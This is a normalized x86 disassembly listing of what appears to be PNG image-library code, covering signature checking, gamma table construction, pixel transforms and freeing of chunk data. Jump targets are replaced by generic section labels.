mov dl [ esp + 0x11 ]
cmp [ ecx - 0x2 ] dl
jne r-xdata
movzx edx [ ecx ]
dec eax
mov [ eax ] dl
movzx edx [ ecx - 0x1 ]
dec ecx
dec eax
mov [ eax ] dl
movzx edx [ ecx - 0x1 ]
dec ecx
dec eax
mov [ eax ] dl
dec eax
dec ecx
sub ebp 0x1
jne r-xdata
mov dl [ esp + 0x10 ]
cmp [ ecx - 0x1 ] dl
jne r-xdata
mov edi [ esp + 0x24 ]
mov [ eax ] 0x0
dec eax
mov [ eax ] 0x0
jmp r-xdata
mov al [ edi + 0x9 ]
mov [ edi + 0x8 ] 0x4
mov [ edi + 0xa ] 0x2
jmp r-xdata
mov cl [ ebp ]
dec edx
mov [ edx ] cl
dec edx
dec ebp
sub eax 0x1
jne r-xdata
movzx eax [ edi ]
mov cl bl
shr eax cl
and eax 0xf
mov cl al
shl cl 0x4
or cl al
mov eax [ esp + 0x14 ]
mov [ eax ] cl
cmp ebx 0x4
jne r-xdata
jmp r-xdata
mov eax 0x1
sub [ esp + 0x14 ] eax
sub [ esp + 0x1c ] eax
jne r-xdata
mov dl [ esp + 0x12 ]
cmp [ ecx - 0x1 ] dl
jne r-xdata
movzx edx [ ecx ]
dec eax
mov [ eax ] dl
movzx edx [ ecx - 0x1 ]
dec ecx
dec eax
mov [ eax ] dl
dec eax
dec ecx
sub edi 0x1
jne r-xdata
mov dl [ esp + 0x13 ]
cmp [ ecx ] dl
jne r-xdata
mov [ eax ] 0x0
dec eax
mov [ eax ] 0x0
jmp r-xdata
movzx edx [ ecx ]
mov [ eax - 0x1 ] dl
movzx edx [ ecx - 0x1 ]
dec eax
dec ecx
mov [ eax - 0x1 ] dl
movzx edx [ ecx - 0x1 ]
dec eax
dec ecx
mov [ eax - 0x1 ] dl
movzx edx [ ecx - 0x1 ]
dec eax
dec ecx
dec eax
mov [ eax ] dl
movzx edx [ ecx - 0x1 ]
dec ecx
dec eax
mov [ eax ] dl
movzx edx [ ecx - 0x1 ]
dec ecx
dec eax
mov [ eax ] dl
dec eax
dec ecx
sub ebp 0x1
jne r-xdata
sub_4360a0
push ecx
mov edx [ esp + 0x8 ]
push ebx
mov ebx [ edx ]
push ebp
mov ebp [ esp + 0x14 ]
push esi
mov esi eax
mov al [ edx + 0x8 ]
push edi
mov edi ecx
mov [ esp + 0x10 ] ebx
cmp al 0x2
jne r-xdata
cmp al 0x6
jne r-xdata
test ebp ebp
je r-xdata
cmp al 0x3
jne r-xdata
test ebp ebp
je r-xdata
cmp [ edx + 0x9 ] 0x8
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
test esi esi
je r-xdata
cmp [ edx + 0x9 ] 0x8
jne r-xdata
test ebx ebx
jbe r-xdata
cmp [ edx + 0x9 ] 0x8
jne r-xdata
test ebx ebx
jbe r-xdata
mov al [ edx + 0x9 ]
mov [ edx + 0xb ] al
cmp al 0x8
mov [ edx + 0x8 ] 0x3
mov [ edx + 0xa ] 0x1
movzx eax al
jb r-xdata
lea esp [ esp ]
mov eax edi
test ebx ebx
jbe r-xdata
mov al [ edx + 0x9 ]
mov [ edx + 0xb ] al
cmp al 0x8
mov [ edx + 0x8 ] 0x3
mov [ edx + 0xa ] 0x1
movzx eax al
jb r-xdata
nop
imul eax ebx
pop edi
pop esi
add eax 0x7
shr eax 0x3
pop ebp
mov [ edx + 0x4 ] eax
pop ebx
pop ecx
retn
shr eax 0x3
imul eax ebx
pop edi
pop esi
pop ebp
mov [ edx + 0x4 ] eax
pop ebx
pop ecx
retn
movzx eax [ ecx ]
movzx esi [ ecx + 0x1 ]
inc ecx
movzx edx [ ecx + 0x1 ]
and eax 0xf8
shl eax 0x5
inc ecx
and esi 0xf8
or eax esi
add eax eax
sar edx 0x3
add eax eax
and edx 0x1f
or eax edx
mov al [ eax + ebp ]
mov [ edi ] al
inc ecx
inc edi
sub ebx 0x1
jne r-xdata
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
lea esp [ esp ]
shr eax 0x3
imul eax ebx
pop edi
pop esi
pop ebp
mov [ edx + 0x4 ] eax
pop ebx
pop ecx
retn
movzx eax [ ecx ]
movzx esi [ ecx + 0x1 ]
inc ecx
movzx edx [ ecx + 0x1 ]
and eax 0xf8
inc ecx
shl eax 0x5
and esi 0xf8
or eax esi
add eax eax
sar edx 0x3
and edx 0x1f
add eax eax
or eax edx
mov dl [ eax + ebp ]
mov [ edi ] dl
add ecx 0x2
inc edi
sub ebx 0x1
jne r-xdata
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
movzx ecx [ eax ]
mov dl [ ecx + esi ]
mov [ eax ] dl
inc eax
sub ebx 0x1
jne r-xdata
sub_436200
sub esp 0x38
push ebx
mov edx 0x8
push ebp
push edi
cmp [ esi + 0x127 ] dl
ja r-xdata
test [ esi + 0x126 ] 0x2
je r-xdata
fld [ esi + 0x160 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x41
jne r-xdata
movzx ecx [ esi + 0x17f ]
movzx ecx [ esi + 0x17c ]
movzx eax [ esi + 0x17d ]
cmp eax ecx
jle r-xdata
fld1
fld [ esi + 0x15c ]
fmul [ esi + 0x160 ]
fld1
fdivrp st1
jmp r-xdata
mov [ esp + 0x10 ] ebx
mov eax ebx
mov eax 0x10
sub eax ecx
mov [ esp + 0x10 ] eax
jmp r-xdata
movzx eax [ esi + 0x17e ]
cmp eax ecx
jle r-xdata
mov ecx eax
call sub_441c3d
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
mov eax [ esi + 0x248 ]
fstp [ esp + 0x30 ]
push 0x100
test eax eax
je r-xdata
cmp eax edx
jle r-xdata
cmp eax 0x5
jge r-xdata
test [ esi + 0x70 ] 0x400
je r-xdata
xor ebx ebx
cmp ecx ebx
jle r-xdata
mov ecx eax
jmp r-xdata
fld [ r--data ]
mov [ esi + 0x164 ] edi
xor edi edi
mov [ esp + 0x10 ] edi
test [ esi + 0x6c ] ebx
jne r-xdata
mov edi eax
mov ebx 0x100000
test edi edi
jne r-xdata
cmp eax ebx
jge r-xdata
mov [ esp + 0x10 ] edx
jmp r-xdata
mov [ esp + 0x10 ] 0x5
jmp r-xdata
fidivr [ esp + 0x10 ]
fld [ esp + 0x30 ]
call sub_456890
fld [ r--data ]
mov ecx [ esi + 0x164 ]
fnstcw [ esp + 0xc ]
movzx eax [ esp + 0xc ]
fmul st1
or eax 0xc00
fxch st1
mov [ esp + 0x1c ] eax
inc edi
cmp edi 0x100
fadd [ r--data ]
fldcw [ esp + 0x1c ]
mov [ esp + 0x10 ] edi
fistp [ esp + 0x1c ]
mov al [ esp + 0x1c ]
mov [ edi + ecx - 0x1 ] al
fldcw [ esp + 0xc ]
jl r-xdata
test [ esi + 0x70 ] 0x600080
fstp st0
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
fld [ esi + 0x160 ]
movzx ecx al
fcomp [ r--data ]
mov [ esi + 0x158 ] ecx
mov ecx edx
sub ecx eax
mov ebp 0x1
shl ebp cl
fnstsw ax
mov [ esp + 0x1c ] ecx
mov [ esp + 0x14 ] ebp
test ah 0x41
jne r-xdata
mov [ esp + 0x10 ] ebx
mov eax [ esp + 0x10 ]
pop edi
pop ebp
pop ebx
add esp 0x38
retn
fld [ esi + 0x15c ]
mov eax [ esi + 0x248 ]
fld1
push 0x100
fdivrp st1
fstp [ esp + 0x34 ]
test eax eax
je r-xdata
fld1
fld [ esi + 0x15c ]
fmul [ esi + 0x160 ]
fld1
fdivrp st1
jmp r-xdata
call sub_441c3d
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
xor eax eax
mov eax [ esi + 0x248 ]
push edi
cmp eax ebx
je r-xdata
lea edi [ ebp * 4 ]
fstp [ esp + 0x30 ]
cmp edi ebx
je r-xdata
fld [ r--data ]
mov [ esi + 0x16c ] edi
xor edi edi
mov [ esp + 0x10 ] edi
test [ esi + 0x6c ] ebx
jne r-xdata
mov edi eax
test edi edi
jne r-xdata
test ebp ebp
jle r-xdata
test ebp ebp
jle r-xdata
call sub_441c3d
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
fidivr [ esp + 0x10 ]
fld [ esp + 0x30 ]
call sub_456890
fld [ r--data ]
fnstcw [ esp + 0xc ]
inc edi
movzx eax [ esp + 0xc ]
fmul st1
or eax 0xc00
fxch st1
cmp edi 0x100
mov [ esp + 0x1c ] eax
fadd [ r--data ]
mov eax [ esi + 0x16c ]
mov [ esp + 0x10 ] edi
fldcw [ esp + 0x1c ]
fistp [ esp + 0x1c ]
mov dl [ esp + 0x1c ]
mov [ edi + eax - 0x1 ] dl
fldcw [ esp + 0xc ]
jl r-xdata
mov eax [ esi + 0x248 ]
fstp st0
push 0x100
test eax eax
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
test [ esi + 0x70 ] 0x600080
je r-xdata
mov eax [ esi + 0x248 ]
push 0x200
test eax eax
je r-xdata
fld1
shl ebp 0x8
fdiv [ esp + 0x30 ]
mov eax ebp
xor ebx ebx
xor edi edi
mov [ esp + 0x20 ] eax
mov [ esp + 0x18 ] ebx
mov [ esp + 0x2c ] ebp
fstp [ esp + 0x30 ]
fild [ esp + 0x20 ]
test eax eax
jge r-xdata
jmp r-xdata
mov eax ebx
jmp r-xdata
test [ esi + 0x6c ] 0x100000
jne r-xdata
mov ebx eax
test ebx ebx
jne r-xdata
call sub_441c3d
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
fld [ esi + 0x15c ]
mov ebp [ esp + 0x14 ]
fld1
lea edi [ ebp * 4 ]
fdivrp st1
fstp [ esp + 0x30 ]
test edi edi
je r-xdata
call sub_441c3d
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
fstp [ esp + 0x38 ]
fadd [ r--data ]
mov eax [ esi + 0x248 ]
push 0x200
test eax eax
je r-xdata
push edi
push 0x0
push eax
mov [ esi + 0x170 ] eax
call sub_443360
add esp 0xc
xor ebx ebx
test [ esi + 0x70 ] 0x480
je r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
fld [ esi + 0x160 ]
mov [ esi + 0x168 ] edi
fcomp [ r--data ]
fnstsw ax
test ah 0x41
jne r-xdata
test [ esi + 0x6c ] ebx
jne r-xdata
mov edi eax
test edi edi
jne r-xdata
xor eax eax
mov eax [ esi + 0x248 ]
push edi
test eax eax
je r-xdata
mov edx [ esi + 0x170 ]
fld [ r--data ]
mov eax [ esp + 0x10 ]
mov [ edx + ebx * 4 ] edi
mov eax [ eax * 4 + r--data ]
imul eax ebx
shr eax 0x4
xor edi edi
mov ebp eax
test [ esi + 0x6c ] 0x100000
jne r-xdata
mov edi eax
test edi edi
jne r-xdata
inc ebx
cmp ebx 0x100
mov [ esp + 0x18 ] ebx
jl r-xdata
movzx ecx bx
mov eax ecx
shl eax 0x8
or eax ecx
mov ecx [ esp + 0x10 ]
mov edx 0xff
sar edx cl
mov [ esp + 0xc ] edx
jmp r-xdata
call sub_441c3d
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
fld [ esi + 0x15c ]
fld [ esi + 0x160 ]
fld1
fdivrp st1
jmp r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
fld [ esi + 0x160 ]
fcomp [ r--data ]
fnstsw ax
test ah 0x41
jne r-xdata
jmp r-xdata
call sub_441c3d
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
fdivrp st1
fld [ esp + 0x30 ]
call sub_456890
fld [ r--data ]
fnstcw [ esp + 0xc ]
add edi 0x2
movzx eax [ esp + 0xc ]
fmul st1
or eax 0xc00
fxch st1
mov [ esp + 0x2c ] eax
mov eax [ esi + 0x170 ]
fadd [ r--data ]
mov ecx [ eax + ebx * 4 ]
fldcw [ esp + 0x2c ]
add ebp 0x100
cmp edi 0x200
fistp [ esp + 0x2c ]
mov dx [ esp + 0x2c ]
mov [ edi + ecx - 0x2 ] dx
fldcw [ esp + 0xc ]
jl r-xdata
fadd [ r--data ]
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
fild [ esp + 0x18 ]
fadd [ r--data ]
fmul [ r--data ]
fld [ esp + 0x30 ]
call sub_456890
fmul [ esp + 0x38 ]
fnstcw [ esp + 0xc ]
movzx eax [ esp + 0xc ]
or eax 0xc00
mov [ esp + 0x20 ] eax
fldcw [ esp + 0x20 ]
fistp [ esp + 0x20 ]
mov eax [ esp + 0x20 ]
mov [ esp + 0x20 ] eax
fldcw [ esp + 0xc ]
cmp edi eax
ja r-xdata
cmp edi ebp
jae r-xdata
mov ecx [ esp + 0x1c ]
mov ebx [ esi + 0x170 ]
mov ebp edi
shr ebp cl
and edx edi
mov ecx [ ebx + edx * 4 ]
inc edi
mov [ ecx + ebp * 2 ] ax
cmp edi [ esp + 0x20 ]
jbe r-xdata
mov edx [ esi + 0x170 ]
mov [ edx + ebx * 4 ] edi
inc ebx
cmp ebx ebp
jl r-xdata
test [ esi + 0x6c ] 0x100000
jne r-xdata
mov edi eax
test edi edi
jne r-xdata
fidivr [ esp + 0x10 ]
fld [ esp + 0x30 ]
call sub_456890
fld [ r--data ]
mov edx [ esi + 0x168 ]
fnstcw [ esp + 0xc ]
movzx eax [ esp + 0xc ]
fmul st1
fxch st1
or eax 0xc00
mov [ esp + 0x1c ] eax
inc edi
cmp edi 0x100
fadd [ r--data ]
fldcw [ esp + 0x1c ]
mov [ esp + 0x10 ] edi
fistp [ esp + 0x1c ]
mov cl [ esp + 0x1c ]
mov [ edi + edx - 0x1 ] cl
fldcw [ esp + 0xc ]
jl r-xdata
fstp st0
pop edi
pop ebp
pop ebx
add esp 0x38
retn
xor edi edi
fstp [ esp + 0x30 ]
fld [ r--data ]
mov [ esp + 0x10 ] edi
fld [ esi + 0x15c ]
fld [ esi + 0x160 ]
fld1
fdivrp st1
jmp r-xdata
mov eax [ esi + 0x248 ]
push 0x200
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
test [ esi + 0x6c ] 0x100000
jne r-xdata
mov ebx eax
test ebx ebx
jne r-xdata
mov ecx ebp
mov [ esp + 0x2c ] ecx
fild [ esp + 0x2c ]
test ecx ecx
jge r-xdata
inc ebx
fstp st0
cmp ebx [ esp + 0x14 ]
jl r-xdata
mov ecx [ esp + 0x10 ]
mov eax 0xff
sar eax cl
mov [ esp + 0xc ] eax
jmp r-xdata
mov edx [ esp + 0xc ]
mov ebp [ esp + 0x2c ]
mov ebx [ esp + 0x18 ]
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
xor eax eax
mov eax [ esi + 0x248 ]
push edi
test eax eax
je r-xdata
mov edi [ esp + 0x14 ]
fstp [ esp + 0x30 ]
add edi edi
add edi edi
je r-xdata
call sub_441c3d
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
push edi
push 0x0
push eax
mov [ esi + 0x178 ] eax
call sub_443360
add esp 0xc
xor ebx ebx
test ebp ebp
jle r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
mov ecx [ esp + 0x1c ]
mov edx [ esi + 0x170 ]
mov ebx edi
shr ebx cl
and eax edi
mov eax [ edx + eax * 4 ]
inc edi
mov ecx 0xffff
mov [ eax + ebx * 2 ] cx
cmp edi ebp
jb r-xdata
mov eax [ esi + 0x248 ]
push 0x200
test eax eax
je r-xdata
call sub_441c3d
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
mov edx [ esi + 0x178 ]
fld [ r--data ]
mov eax [ esp + 0x10 ]
mov [ edx + ebx * 4 ] edi
mov eax [ eax * 4 + r--data ]
imul eax ebx
shr eax 0x4
xor edi edi
mov ebp eax
test [ esi + 0x6c ] 0x100000
jne r-xdata
mov edi eax
test edi edi
jne r-xdata
mov eax [ esp + 0xc ]
jmp r-xdata
call sub_441c3d
add esp 0x4
push esi
call eax
add esp 0x8
jmp r-xdata
mov eax ebx
jmp r-xdata
test [ esi + 0x6c ] 0x100000
jne r-xdata
mov ebx eax
test ebx ebx
jne r-xdata
fdivrp st1
fld [ esp + 0x30 ]
call sub_456890
fld [ r--data ]
fnstcw [ esp + 0xc ]
add edi 0x2
movzx eax [ esp + 0xc ]
fmul st1
or eax 0xc00
fxch st1
mov [ esp + 0x2c ] eax
mov eax [ esi + 0x178 ]
fadd [ r--data ]
mov ecx [ eax + ebx * 4 ]
fldcw [ esp + 0x2c ]
add ebp 0x100
cmp edi 0x200
fistp [ esp + 0x2c ]
mov dx [ esp + 0x2c ]
mov [ edi + ecx - 0x2 ] dx
fldcw [ esp + 0xc ]
jl r-xdata
fadd [ r--data ]
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
mov edx [ esi + 0x174 ]
fld [ r--data ]
mov eax [ esp + 0x10 ]
mov [ edx + ebx * 4 ] edi
mov eax [ eax * 4 + r--data ]
imul eax ebx
shr eax 0x4
xor edi edi
mov ebp eax
test [ esi + 0x6c ] 0x100000
jne r-xdata
mov edi eax
test edi edi
jne r-xdata
push edi
push 0x0
push eax
mov [ esi + 0x174 ] eax
call sub_443360
xor ebx ebx
add esp 0xc
cmp [ esp + 0x14 ] ebx
jle r-xdata
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
mov ecx ebp
mov [ esp + 0x2c ] ecx
fild [ esp + 0x2c ]
test ecx ecx
jge r-xdata
inc ebx
fstp st0
cmp ebx [ esp + 0x14 ]
jl r-xdata
fdivrp st1
fld [ esp + 0x30 ]
call sub_456890
fld [ r--data ]
fnstcw [ esp + 0xc ]
add edi 0x2
movzx eax [ esp + 0xc ]
fmul st1
or eax 0xc00
fxch st1
mov [ esp + 0x2c ] eax
mov eax [ esi + 0x174 ]
fadd [ r--data ]
mov ecx [ eax + ebx * 4 ]
fldcw [ esp + 0x2c ]
add ebp 0x100
cmp edi 0x200
fistp [ esp + 0x2c ]
mov dx [ esp + 0x2c ]
mov [ edi + ecx - 0x2 ] dx
fldcw [ esp + 0xc ]
jl r-xdata
fadd [ r--data ]
push esi
mov ecx r--data
call sub_43b740
add esp 0x4
mov ecx ebp
mov [ esp + 0x2c ] ecx
fild [ esp + 0x2c ]
test ecx ecx
jge r-xdata
inc ebx
fstp st0
cmp ebx [ esp + 0x14 ]
jl r-xdata
sub_436af0
push edi
mov edi ecx
mov cl [ eax + 0x8 ]
test cl 0x2
je r-xdata
pop edi
retn
mov edx [ eax ]
mov al [ eax + 0x9 ]
push esi
cmp al 0x8
jne r-xdata
cmp al 0x10
jne r-xdata
cmp cl 0x2
jne r-xdata
pop esi
push ebp
cmp cl 0x2
jne r-xdata
cmp cl 0x6
jne r-xdata
mov esi 0x3
jmp r-xdata
cmp cl 0x6
jne r-xdata
mov ebp 0x6
jmp r-xdata
mov esi 0x4
test edx edx
jbe r-xdata
pop ebp
mov ebp 0x8
test edx edx
jbe r-xdata
lea eax [ edi + 0x2 ]
mov edi edi
lea eax [ edi + 0x1 ]
mov edi edx
push ebx
jmp r-xdata
mov cl [ eax - 0x1 ]
add [ eax - 0x2 ] cl
add [ eax ] cl
add eax esi
sub edx 0x1
jne r-xdata
pop esi
pop edi
retn
movzx esi [ eax + 0x1 ]
movzx ecx [ eax + 0x2 ]
movzx edx [ eax ]
movzx ebx [ eax + 0x4 ]
shl esi 0x8
or esi ecx
movzx ecx [ eax - 0x1 ]
shl ecx 0x8
or ecx edx
movzx edx [ eax + 0x3 ]
shl edx 0x8
or edx ebx
add ecx esi
and ecx 0xffff
add edx esi
and edx 0xffff
mov ebx ecx
mov [ eax ] cl
mov ecx edx
shr ebx 0x8
shr ecx 0x8
mov [ eax - 0x1 ] bl
mov [ eax + 0x3 ] cl
mov [ eax + 0x4 ] dl
add eax ebp
sub edi 0x1
jne r-xdata
pop ebx
sub_436bd0
sub esp 0xc
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov cl 0xa
mov [ esp ] 0x89
mov [ esp + 0x1 ] 0x50
mov [ esp + 0x2 ] 0x4e
mov [ esp + 0x3 ] 0x47
mov [ esp + 0x4 ] 0xd
mov [ esp + 0x5 ] cl
mov [ esp + 0x6 ] 0x1a
mov [ esp + 0x7 ] cl
cmp eax 0x8
jbe r-xdata
cmp eax 0x1
jae r-xdata
mov eax 0x8
cmp edx 0x7
ja r-xdata
or eax 0xffffffff
mov ecx [ esp + 0x8 ]
xor ecx esp
call sub_43f96b
add esp 0xc
retn
lea ecx [ edx + eax ]
cmp ecx 0x8
jbe r-xdata
push esi
push edi
mov edi [ esp + 0x18 ]
lea ecx [ esp + edx + 0x8 ]
add edx edi
mov esi eax
cmp eax 0x4
jb r-xdata
mov eax 0x8
sub eax edx
test esi esi
je r-xdata
mov eax [ edx ]
cmp eax [ ecx ]
jne r-xdata
mov ecx [ esp + 0x10 ]
pop edi
pop esi
xor ecx esp
xor eax eax
call sub_43f96b
add esp 0xc
retn
movzx eax [ edx ]
movzx edi [ ecx ]
sub eax edi
jne r-xdata
sub esi 0x4
add ecx 0x4
add edx 0x4
cmp esi 0x4
jae r-xdata
sar eax 0x1f
pop edi
or eax 0x1
pop esi
mov ecx [ esp + 0x8 ]
xor ecx esp
call sub_43f96b
add esp 0xc
retn
cmp esi 0x1
jbe r-xdata
movzx eax [ edx + 0x1 ]
movzx edi [ ecx + 0x1 ]
sub eax edi
jne r-xdata
cmp esi 0x2
jbe r-xdata
movzx eax [ edx + 0x2 ]
movzx edi [ ecx + 0x2 ]
sub eax edi
jne r-xdata
cmp esi 0x3
jbe r-xdata
movzx eax [ edx + 0x3 ]
movzx ecx [ ecx + 0x3 ]
sub eax ecx
sub_436ce0
push ebx
mov ebx [ esp + 0x10 ]
or eax 0xffffffff
xor edx edx
div ebx
mov ecx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esi + 0x6c ]
cmp ecx eax
jbe r-xdata
imul ecx ebx
mov eax edi
or eax 0x100000
mov [ esi + 0x6c ] eax
call sub_43b650
mov [ esi + 0x6c ] edi
pop edi
pop esi
pop ebx
retn
mov ecx r--data
call sub_43b800
pop edi
pop esi
xor eax eax
pop ebx
retn
sub_436d30
mov ecx [ esp + 0x4 ]
test ecx ecx
je r-xdata
retn
mov edx [ esp + 0x8 ]
test edx edx
je r-xdata
mov eax [ ecx + 0x24c ]
test eax eax
je r-xdata
push edx
call sub_44120e
pop ecx
mov [ esp + 0x8 ] edx
mov [ esp + 0x4 ] ecx
jmp eax
sub_436d60
push ebx
push edi
mov edi [ esp + 0xc ]
xor ebx ebx
cmp edi ebx
je r-xdata
pop edi
pop ebx
retn
push esi
mov esi [ esp + 0x14 ]
cmp esi ebx
je r-xdata
pop esi
mov eax [ esi + 0xb8 ]
and eax [ esp + 0x18 ]
push ebp
mov ebp [ esp + 0x20 ]
test eax 0x4000
je r-xdata
mov edx [ esi + 0xb8 ]
and edx [ esp + 0x1c ]
test edx 0x2000
je r-xdata
cmp ebp 0xffffffff
je r-xdata
mov eax [ esi + 0xb8 ]
and eax [ esp + 0x1c ]
test eax 0x100
je r-xdata
mov ecx [ esi + 0x4c ]
cmp ecx ebx
je r-xdata
xor ebp ebp
cmp [ esi + 0x30 ] ebx
jle r-xdata
mov eax [ esi + 0x38 ]
cmp eax ebx
je r-xdata
test al al
jns r-xdata
and [ esi + 0x8 ] 0xffffbfff
and [ esi + 0x8 ] 0xffffffef
mov [ esi + 0x4c ] ebx
mov eax [ edi + 0x24c ]
push ecx
cmp eax ebx
je r-xdata
mov ecx [ esi + 0x38 ]
cmp ecx ebx
je r-xdata
push ebp
push 0x4000
push esi
push edi
call sub_436d60
inc ebp
add esp 0x10
cmp ebp [ esi + 0x30 ]
jl r-xdata
shl ebp 0x4
mov edx [ eax + ebp + 0x4 ]
cmp edx ebx
je r-xdata
mov eax [ esi + 0xb8 ]
and eax [ esp + 0x1c ]
test al 0x10
je r-xdata
mov ecx [ esi + 0xa0 ]
cmp ecx ebx
je r-xdata
call sub_44120e
add esp 0x4
push edi
call eax
add esp 0x8
jmp r-xdata
mov [ esi + 0x38 ] ebx
mov [ esi + 0x30 ] ebx
mov eax [ edi + 0x24c ]
push ecx
cmp eax ebx
je r-xdata
mov ecx edi
call sub_43b6a0
mov ecx [ esi + 0x38 ]
mov [ ecx + ebp + 0x4 ] ebx
jmp r-xdata
mov ecx [ esi + 0xb8 ]
and ecx [ esp + 0x1c ]
test cl 0x20
je r-xdata
mov ecx [ esi + 0xc4 ]
cmp ecx ebx
je r-xdata
mov ecx [ esi + 0xac ]
cmp ecx ebx
je r-xdata
mov eax [ edi + 0x24c ]
push ecx
cmp eax ebx
je r-xdata
call sub_44120e
add esp 0x4
push edi
call eax
add esp 0x8
jmp r-xdata
mov ecx [ edi + 0x274 ]
cmp ecx ebx
je r-xdata
mov ebp [ esp + 0x20 ]
cmp ebp 0xffffffff
je r-xdata
mov ecx [ esi + 0xc8 ]
cmp ecx ebx
je r-xdata
mov eax [ edi + 0x24c ]
push ecx
cmp eax ebx
je r-xdata
mov [ esi + 0xa0 ] ebx
mov [ esi + 0xac ] ebx
cmp [ esi + 0xb0 ] ebx
je r-xdata
mov eax [ edi + 0x24c ]
push ecx
cmp eax ebx
je r-xdata
call sub_44120e
add esp 0x4
push edi
call eax
add esp 0x8
jmp r-xdata
mov edx [ esi + 0xb8 ]
mov ebp [ esp + 0x1c ]
and edx ebp
test edx 0x200
je r-xdata
mov eax [ edi + 0x24c ]
push ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0xd8 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0xd4 ]
cmp eax ebx
je r-xdata
and [ esi + 0x8 ] 0xffffefff
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] ebx
mov eax [ edi + 0x24c ]
push ecx
cmp eax ebx
je r-xdata
call sub_44120e
add esp 0x4
push edi
call eax
add esp 0x8
jmp r-xdata
and [ esi + 0x8 ] 0xfffffbff
xor ebp ebp
cmp [ esi + 0xb5 ] bl
jbe r-xdata
call sub_44120e
add esp 0x4
push edi
call eax
add esp 0x8
jmp r-xdata
mov ecx [ esi + 0xb8 ]
and ecx ebp
test cl 0x8
je r-xdata
cmp [ esp + 0x20 ] 0xffffffff
je r-xdata
call sub_44120e
add esp 0x4
push edi
call eax
add esp 0x8
jmp r-xdata
and [ esi + 0x8 ] 0xffffdfff
xor ebp ebp
cmp eax ebx
jle r-xdata
shl ebp 0x4
mov eax [ eax + ebp ]
cmp eax ebx
je r-xdata
call sub_44120e
add esp 0x4
push edi
call eax
add esp 0x8
jmp r-xdata
mov ecx [ esi + 0xb0 ]
cmp ecx ebx
je r-xdata
mov eax [ esi + 0xb0 ]
mov eax [ eax + ebp * 4 ]
cmp eax ebx
je r-xdata
mov edx [ esi + 0xb8 ]
and edx ebp
test edx 0x1000
je r-xdata
mov ecx [ esi + 0x7c ]
cmp ecx ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0xbc ]
cmp eax ebx
je r-xdata
mov [ edi + 0x274 ] ebx
mov ecx [ esi + 0xd4 ]
cmp ecx ebx
je r-xdata
lea esp [ esp ]
mov edx [ esi + 0xd4 ]
mov eax [ edx + ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov ecx [ edi + 0x24c ]
push eax
cmp ecx ebx
je r-xdata
mov [ esi + 0xb0 ] ebx
mov eax [ edi + 0x24c ]
push ecx
cmp eax ebx
je r-xdata
mov ecx [ esi + 0xb0 ]
mov [ ecx + ebp * 4 ] ebx
movzx edx [ esi + 0xb5 ]
inc ebp
cmp ebp edx
jl r-xdata
mov ecx [ edi + 0x24c ]
push eax
cmp ecx ebx
je r-xdata
mov ecx [ esi + 0xb8 ]
and ecx ebp
test cl 0x40
je r-xdata
mov ecx [ esi + 0x10 ]
cmp ecx ebx
je r-xdata
and [ esi + 0x8 ] 0xffffffbf
mov [ esi + 0x7c ] ebx
mov eax [ edi + 0x24c ]
push ecx
cmp eax ebx
je r-xdata
xor ebp ebp
cmp eax ebx
jle r-xdata
mov ebp [ esp + 0x20 ]
lea ebp [ ebp + ebp * 4 ]
add ebp ebp
add ebp ebp
mov eax [ eax + ebp + 0x8 ]
cmp eax ebx
je r-xdata
mov [ esi + 0xd4 ] ebx
mov [ esi + 0xd8 ] ebx
mov eax [ edi + 0x24c ]
push ecx
cmp eax ebx
je r-xdata
push ebp
push 0x20
push esi
push edi
call sub_436d60
inc ebp
add esp 0x10
cmp ebp [ esi + 0xd8 ]
jl r-xdata
mov eax [ esi + 0xd4 ]
mov [ eax + ebp ] ebx
mov ecx [ esi + 0xd4 ]
mov [ ecx + ebp + 0x8 ] ebx
jmp r-xdata
mov ecx [ edi + 0x24c ]
push eax
cmp ecx ebx
je r-xdata
call sub_44120e
add esp 0x4
push edi
call ecx
add esp 0x8
jmp r-xdata
call sub_44120e
add esp 0x4
push edi
call eax
add esp 0x8
jmp r-xdata
call sub_44120e
add esp 0x4
push edi
call ecx
add esp 0x8
jmp r-xdata
cmp [ esp + 0x20 ] 0xffffffff
je r-xdata
cmp [ esi + 0xf8 ] ebx
je r-xdata
and [ esi + 0x8 ] 0xfffffff7
xor eax eax
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ax
mov eax [ edi + 0x24c ]
push ecx
cmp eax ebx
je r-xdata
call sub_44120e
add esp 0x4
push edi
call eax
add esp 0x8
jmp r-xdata
mov ecx [ esi + 0xbc ]
cmp ecx ebx
je r-xdata
jmp r-xdata
mov eax [ esi + 0xbc ]
mov [ eax + ebp + 0x8 ] ebx
jmp r-xdata
mov ecx [ edi + 0x24c ]
push eax
cmp ecx ebx
je r-xdata
call sub_44120e
add esp 0x4
push edi
call eax
add esp 0x8
jmp r-xdata
